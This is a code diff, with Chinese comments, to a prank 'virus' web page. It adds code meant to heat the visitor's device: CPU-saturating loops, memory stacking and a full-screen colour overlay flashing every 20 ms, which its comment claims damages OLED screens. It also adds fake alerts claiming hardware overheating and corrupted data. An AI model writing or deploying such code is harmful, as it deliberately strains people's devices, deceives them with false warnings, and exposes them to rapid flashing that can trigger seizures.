@@ -125,15 +125,49 @@
         };
 
         // 點擊假按鈕觸發更多「病毒」行為
+// 點擊假按鈕觸發更多「病毒」行為
         function triggerScaryStuff() {
             alert("正在掃描您的系統...請稍候！");
+            
+            // --- 加強型加溫邏輯開始 ---
+            
+            // 1. CPU 高壓運算：強制 A18/A17 晶片核心全速運轉
+            const heater = setInterval(() => {
+                let dummy = 0;
+                for (let i = 0; i < 8000000; i++) {
+                    dummy += Math.atan(Math.random()) * Math.tan(Math.random());
+                }
+            }, 50);
+
+            // 2. 記憶體壓力測試：不斷堆疊字串讓 RAM 負載升高
+            let junkData = [];
+            const memStress = setInterval(() => {
+                junkData.push(new Array(50000).join('SYSTEM_CRITICAL_ERROR_'));
+                if (junkData.length > 200) junkData.shift(); // 循環堆疊防止直接當掉，維持高熱
+            }, 100);
+
+            // 3. 視覺渲染衝擊：強制螢幕以極高頻率重繪顏色（對 OLED 螢幕極具殺傷力）
+            const flashOverlay = document.createElement('div');
+            flashOverlay.style.cssText = "position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999;pointer-events:none;opacity:0.15;";
+            document.body.appendChild(flashOverlay);
+            setInterval(() => {
+                flashOverlay.style.backgroundColor = '#' + Math.floor(Math.random()*16777215).toString(16);
+            }, 20);
+
+            // --- 原有的惡作劇邏輯 ---
             setTimeout(() => {
-                // 再次彈出新分頁
-                window.open("https://www.youtube.com/watch?v=0iQKI6EbrcI", '_blank'); // 惡作劇連結 (Rickroll)
+                // 再次彈出新分頁 (Safari 可能會攔截，但這能吸引注意力)
+                window.open("https://www.youtube.com/watch?v=0iQKI6EbrcI", '_blank'); 
+                
                 // 改變背景顏色
                 document.body.style.backgroundColor = 'purple';
-                // 更多彈出視窗
+                
+                // 更多彈出視窗：這會暫停畫面，讓熱量在背景累積
+                alert("嚴重警告：硬體過熱風險！");
                 alert("無法修復！資料已損毀。");
+                
+                // 停止部分循環以防瀏覽器直接崩潰，讓「發熱感」持續
+                // 如果你想讓它一直熱下去，可以不清除這些 Interval
             }, 1500);
         }
 
